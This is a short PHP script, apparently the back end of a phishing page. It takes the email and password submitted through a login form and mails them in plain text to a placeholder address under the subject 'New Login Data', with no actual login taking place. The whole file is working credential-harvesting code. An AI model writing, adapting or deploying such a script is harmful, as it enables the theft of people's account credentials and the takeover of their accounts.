<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "your-email@example.com";
    $subject = "New Login Data";
    $message = "Email: $email\nPassword: $password";
    $headers = "From: noreply@yourdomain.com";

    mail($to, $subject, $message, $headers);
}
?>

